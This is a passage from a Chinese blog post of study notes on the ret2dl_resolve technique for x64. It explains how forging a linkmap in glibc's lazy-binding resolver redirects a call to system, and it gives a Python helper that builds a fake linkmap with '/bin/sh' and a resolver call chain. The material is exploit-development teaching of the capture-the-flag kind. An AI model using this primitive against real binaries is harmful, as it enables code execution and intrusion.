class="line"><span class="comment">     of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">     offset.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (result,</span><br><span class="line">                   sym ? (<span class="built_in">LOOKUP_VALUE_ADDRESS</span> (result)</span><br><span class="line">                      + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">     address) is also known.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = <span class="built_in">elf_machine_plt_value</span> (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (<span class="built_in">ELFW</span>(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = <span class="built_in">elf_ifunc_invoke</span> (<span class="built_in">DL_FIXUP_VALUE_ADDR</span> (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">elf_machine_fixup_plt</span> (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>9-21行程序从linkmap读取必要的信息,L25处的if表示这个函数是否已经解析过,若已经解析过则来到L71,执行<br><code>value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)</span><br><span class="line">/* Extract the code address from a value of type DL_FIXUP_MAKE_VALUE.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
<p><code>sym</code>是通过linkmap解析出来的,因此<code>sym-&gt;st_value</code>可以伪造成任意值,而<code>l-&gt;l_addr</code>是linkmap的第一个元素,8字节,如果linkmap刚好够着got表,让<code>l-&gt;l_addr</code>内为got表的一个函数,假设为<code>__libc_start_main</code>,如果我们想调用<code>system</code>,只需构造<code>sym-&gt;st_value</code>为<code>system</code>和<code>__libc_start_main</code>之间的相对偏移即可.当然,只要你能在固定位置找到一个glibc上的指针,能够计算相对偏移应该都是可以的.</p>
<p>同样,我也写了一个函数来快速实现exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dl_resolve_linkmap_x64</span>(<span class="params">ELF_obj,known_offset_addr,two_offset,linkmap_addr</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    WARNING: assert *(known_offset_addr-8) &amp; 0x0000ff0000000000 != 0 </span></span><br><span class="line"><span class="string">    WARNING: fake_linkmap is 0x100 bytes length,be careful</span></span><br><span class="line"><span class="string">    WARNING: two_offset = target - *(known_offset_addr)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    _dl_runtime_resolve(linkmap,reloc_arg)</span></span><br><span class="line"><span class="string">    reloc_arg=0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    linkmap:</span></span><br><span class="line"><span class="string">    0x00: START</span></span><br><span class="line"><span class="string">    0x00: l_addr = two_offset</span></span><br><span class="line"><span class="string">    0x08: fake_DT_JMPREL : 0</span></span><br><span class="line"><span class="string">    0x10: fake_DT_JMPREL : p_fake_JMPREL</span></span><br><span class="line"><span class="string">    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset</span></span><br><span class="line"><span class="string">    0x20: r_info</span></span><br><span class="line"><span class="string">    0x28: append</span></span><br><span class="line"><span class="string">    0x30: r_offset</span></span><br><span class="line"><span class="string">    0x38: fake_DT_SYMTAB: 0</span></span><br><span class="line"><span class="string">    0x40: fake_DT_SYMTAB: known_offset_addr-8</span></span><br><span class="line"><span class="string">    0x48: /bin/sh(for system)</span></span><br><span class="line"><span class="string">    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)</span></span><br><span class="line"><span class="string">    0x70: p_DT_SYMTAB = fake_DT_SYMTAB</span></span><br><span class="line"><span class="string">    0xf8: p_DT_JMPREL = fake_DT_JMPREL</span></span><br><span class="line"><span class="string">    0x100: END</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    plt0 = ELF_obj.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    linkmap=<span class="string">&quot;&quot;</span></span><br><span class="line">    linkmap+=p64(two_offset&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>))</span><br><span class="line">    linkmap+=p64(<span class="number">0</span>)+p64(linkmap_addr+<span class="number">0x18</span>)</span><br><span class="line">    linkmap+=p64((linkmap_addr+<span class="number">0x30</span>-two_offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>))+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    linkmap+=p64(<span class="number">0</span>)</span><br><span class="line">    linkmap+=p64(<span class="number">0</span>)+p64(known_offset_addr-<span class="number">8</span>)</span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span><span class="comment">#for system offset 0x48</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(linkmap_addr)</span><br><span class="line">    linkmap+=p64(linkmap_addr+<span class="number">0x38</span>)</span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(linkmap_addr+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0+<span class="number">6</span>)+p64(linkmap_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> (linkmap,resolve_call)</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#x86"><span class="toc-number">1.</span> <span class="toc-text">x86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-number">2.</span> <span class="toc-text">x64</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=ret2dl_resolve学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=ret2dl_resolve学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ret2dl_resolve学习笔记&body=Check out this article: https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=ret2dl_resolve学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=ret2dl_resolve学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    veritas501
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
